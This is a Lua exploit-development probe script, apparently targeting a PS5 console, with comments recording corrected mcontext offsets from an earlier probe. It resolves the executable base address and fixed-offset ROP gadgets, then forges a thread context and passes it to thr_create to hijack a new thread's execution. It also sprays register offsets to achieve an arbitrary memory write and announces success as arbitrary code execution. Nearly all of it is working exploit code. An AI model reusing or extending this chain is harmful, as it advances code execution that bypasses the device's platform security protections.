-- CRASH_CLASS: MODERATE
-- PROBE 80g: Thread creation with CORRECT mcontext offsets
--
-- Context: 80f's getcontext(421) revealed the real layout:
--   ctx+0xE0 = mc_rip   (was assumed +0x90)
--   ctx+0xE8 = mc_cs    (was assumed +0x98)  = 0x43
--   ctx+0xF0 = mc_rflags (was assumed +0xA0) = 0x202
--   ctx+0xF8 = mc_rsp   (was assumed +0xA8)
--   ctx+0x100 = mc_ss   (was assumed +0xB0)  = 0x3B
--   ctx+0x108 = mc_len  (correct)            = 0x480
--   ctx+0x110 = mc_flags (correct)           = 0x10002
--
-- Previous probes wrote CS=0x43 at +0x98, which is NOT mc_cs.
-- The kernel read CS=0 from +0xE8 (zeroed context) → panic.
-- This probe writes at the correct offsets.
--
-- Section A: ret gadget with CS=0x43 at correct offset (should NOT panic!)
-- Section B: write gadget (mov [rdi],eax;ret) with register priming

print("=== PROBE 80g: THREAD WITH CORRECT OFFSETS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

syscall.resolve({ sc_getpid = 20 })
print("[*] pid=" .. tostring(syscall.sc_getpid():tonumber()))

-- Eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
local eboot = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[*] eboot=" .. q(eboot))

-- Known gadgets (ASLR-relative, stable offsets)
local ret_gadget = eboot + 0x42
local mov_rdi_eax = eboot + 0x92C68
print("[*] ret=" .. q(ret_gadget))
print("[*] mov_rdi_eax=" .. q(mov_rdi_eax))

-- Verify gadget bytes
local b0, b1, b2 = rb(mov_rdi_eax), rb(mov_rdi_eax+1), rb(mov_rdi_eax+2)
print("[*] verify: " .. string.format("%02X %02X %02X", b0 or 0, b1 or 0, b2 or 0) ..
    (b0 == 0x89 and b1 == 0x07 and b2 == 0xC3 and " OK" or " BAD"))

-- CORRECT offsets from 80f getcontext results
local CTX_RIP    = 0xE0
local CTX_CS     = 0xE8
local CTX_RFLAGS = 0xF0
local CTX_RSP    = 0xF8
local CTX_SS     = 0x100
local CTX_LEN    = 0x108
local CTX_FLAGS  = 0x110

-- Register offsets need to be determined from the getcontext dump too.
-- From 80f: +0x80=rax, +0x88=rbp. The standard mcontext layout shifted by +0x50.
-- Standard FreeBSD mcontext: rdi=+0x48, rsi=+0x50, rdx=+0x58, rbx=+0x60, rcx=+0x68, rax=+0x70
-- Shifted by +0x10 (ucontext header) then another +0x50... let's just compute:
-- 80f shows rax at ctx+0x80, but getcontext returned rax=0x73A8A976 there.
-- Actually, let me re-derive from the full dump:
--   +0x80 = 0x73A8A976 (rax - a code address, makes sense for syscall return)
--   +0x88 = 0x7EFE5A890 (rbp - a stack-like address)
-- Standard mcontext on FreeBSD amd64:
--   mc_onstack, mc_rdi, mc_rsi, mc_rdx, mc_rcx, mc_r8, mc_r9,
--   mc_rax, mc_rbx, mc_rbp, mc_r10, mc_r11, mc_r12, mc_r13, mc_r14, mc_r15,
--   mc_trapno, mc_fs, mc_gs, mc_addr, mc_flags2, mc_err,
--   mc_rip, mc_cs, mc_rflags, mc_rsp, mc_ss
-- At ctx+0x10 (uc_mcontext), each field is 8 bytes:
--   +0x10: mc_onstack
--   +0x18: mc_rdi
--   +0x20: mc_rsi
--   +0x28: mc_rdx
--   +0x30: mc_rcx
--   +0x38: mc_r8
--   +0x40: mc_r9
--   +0x48: mc_rax
--   +0x50: mc_rbx
--   +0x58: mc_rbp
-- But 80f shows rax at +0x80 and rbp at +0x88. That's +0x38 more than standard.
-- Sony added fields? Or uc_mcontext starts later?
-- Let's just use the getcontext output to find rdi.
-- 80f zeroed before getcontext, so non-zero fields are set by the kernel.
-- Most registers were 0 (rdi/rsi/rdx/rbx/rcx all 0). rax and rbp were non-zero.
-- rip is at +0xE0. Count back:
--   rip is typically at mc_onstack + 22*8 = +0x10 + 0xB0 = +0xC0 in standard FreeBSD
--   Here rip is at +0xE0, so mc starts at +0x30 (0xE0 - 0xB0 = 0x30)?
-- Or: rip = mcontext_start + 22*8. If rip=+0xE0, mcontext_start = 0xE0 - 22*8 = 0xE0-0xB0 = 0x30
-- So mc_rdi = 0x30 + 1*8 = 0x38
-- mc_rax = 0x30 + 7*8 = 0x30 + 0x38 = 0x68
-- But 80f shows rax at +0x80... hmm.
--
-- Let me try a different mcontext layout. PS5 / FreeBSD 11:
-- Maybe the order is different. Let's use the mc_rip position and work backwards.
-- Actually, safest approach: just getcontext, modify only the fields we know, test.

-- Register offsets: we'll determine by getcontext with known register values
-- For now, use brute force: set RDI at several candidate offsets

-- GPU mmap for stack
local sc_mmap = make_syscall(477)
local s_ok, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local stack_top = stack_base + (7 * 0x4000)
zero(stack_top, 0x200)
print("[*] stack=" .. q(stack_top))

local marker = memory.alloc(16)
zero(marker, 16)

-- ============================================================
-- A: Use getcontext as base, modify RIP only → ret gadget
--    This should give us rv=0 AND survive (CS=0x43 from current thread)
-- ============================================================
print("")
print("=== A: getcontext + modify RIP to ret gadget ===")

local ctx = memory.alloc(0x600)
zero(ctx, 0x600)

-- Get current context (fills in correct CS/SS/RFLAGS/everything)
local sc_getctx = make_syscall(421)
pcall(function() sc_getctx(uint64(ctx)) end)

-- Verify we got CS=0x43
print("  getcontext CS=0x" .. string.format("%X", rd(ctx + CTX_CS) or 0))
print("  getcontext SS=0x" .. string.format("%X", rd(ctx + CTX_SS + 4) or 0) ..
    string.format("%08X", rd(ctx + CTX_SS) or 0))

-- Override RIP and RSP
wq(ctx + CTX_RIP, ret_gadget)
wq(ctx + CTX_RSP, stack_top)

-- Dump the context we're about to pass
print("  ctx+0xE0 (RIP): " .. q(rq(ctx + 0xE0)))
print("  ctx+0xE8 (CS):  " .. q(rq(ctx + 0xE8)))
print("  ctx+0xF0 (FL):  " .. q(rq(ctx + 0xF0)))
print("  ctx+0xF8 (RSP): " .. q(rq(ctx + 0xF8)))
print("  ctx+0x100(SS):  " .. q(rq(ctx + 0x100)))
print("  ctx+0x108(LEN): " .. q(rq(ctx + 0x108)))

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)

print("  [BEFORE] thr_create...")
local ok1, rv1 = pcall(function()
    local sc = make_syscall(430)
    return sc(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(rv1) .. " ok=" .. tostring(ok1))
print("  tid=" .. q(rq(tid_buf)))

local rv1_num = to_num(rv1)
if rv1_num == 0 or (type(rv1) == "table" and rv1.h == 0 and rv1.l == 0) then
    print("  *** RV=0 WITH CS=0x43! Thread should be running! ***")

    -- Wait and check if PS5 survives
    local dummy = 0
    for i = 1, 3000000 do dummy = dummy + 1 end

    local alive = pcall(function() return syscall.sc_getpid():tonumber() end)
    print("  *** POST-WAIT CANARY: " .. tostring(alive) .. " ***")

    if alive then
        print("  *** PS5 SURVIVED! THREAD CREATED AND DIDN'T PANIC! ***")
    end
else
    print("  rv != 0, thread rejected (rv=" .. tostring(rv1_num) .. ")")
end

-- ============================================================
-- B: getcontext + RIP=write gadget + RDI=marker + RAX=0xDEADBEEF
-- ============================================================
print("")
print("=== B: getcontext + write gadget ===")

-- Fresh context
zero(ctx, 0x600)
pcall(function() sc_getctx(uint64(ctx)) end)

-- Override execution
wq(ctx + CTX_RIP, mov_rdi_eax)    -- RIP = mov [rdi], eax; ret
wq(ctx + CTX_RSP, stack_top)      -- RSP = clean stack (ret into 0)
zero(stack_top, 0x100)

-- We need to find where RDI and RAX are in the context.
-- From the mcontext analysis above, if mc starts at ctx+0x30:
--   mc_rdi = ctx+0x38, mc_rax = ctx+0x68
-- Or if the layout matches the observed positions:
--   rax was at ctx+0x80 in getcontext output
-- Let's try both sets of offsets.

-- Approach: getcontext fills in the current registers. We need to set
-- RDI and RAX. Let's scan the getcontext output for the rax value we know.
-- Actually, the cleanest approach: just set ALL likely rdi/rax offsets.

wd(marker, 0x41414141)
print("  marker before: 0x" .. string.format("%08X", rd(marker)))

-- Candidate RDI offsets (try all plausible ones)
local rdi_candidates = {0x18, 0x20, 0x28, 0x30, 0x38, 0x48, 0x58, 0x68, 0x78, 0x88, 0x98, 0xA8}
-- Candidate RAX offsets
local rax_candidates = {0x48, 0x50, 0x58, 0x60, 0x68, 0x70, 0x78, 0x80, 0x88, 0x90, 0x98, 0xA8}

-- Set marker address at ALL rdi candidates and 0xDEADBEEF at ALL rax candidates
-- One of them will be right. The wrong ones just set unused registers.
for _, off in ipairs(rdi_candidates) do
    wq(ctx + off, marker)
end
for _, off in ipairs(rax_candidates) do
    wq(ctx + off, uint64(0xDEADBEEF))
end

-- Re-set the critical fields we know
wq(ctx + CTX_RIP, mov_rdi_eax)
wq(ctx + CTX_RSP, stack_top)

zero(tid_buf, 8)
print("  [BEFORE] thr_create...")
local ok2, rv2 = pcall(function()
    local sc = make_syscall(430)
    return sc(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(rv2) .. " ok=" .. tostring(ok2))
print("  tid=" .. q(rq(tid_buf)))

-- Wait
local dummy = 0
for i = 1, 5000000 do dummy = dummy + 1 end

local marker_val = rd(marker)
print("  marker after: 0x" .. string.format("%08X", marker_val or 0))

if marker_val == 0xDEADBEEF then
    print("")
    print("  ****************************************************")
    print("  *** MARKER = 0xDEADBEEF — THREAD WROTE TO MEMORY ***")
    print("  *** ARBITRARY CODE EXECUTION VIA THREAD ROP!      ***")
    print("  ****************************************************")
elseif marker_val ~= 0x41414141 then
    print("  *** MARKER CHANGED! Partial execution? val=0x" .. string.format("%08X", marker_val) .. " ***")
else
    print("  marker unchanged")
end

local alive = pcall(function() return syscall.sc_getpid():tonumber() end)
print("")
print("[*] canary: " .. tostring(alive))
print("=== PROBE 80g COMPLETE ===")
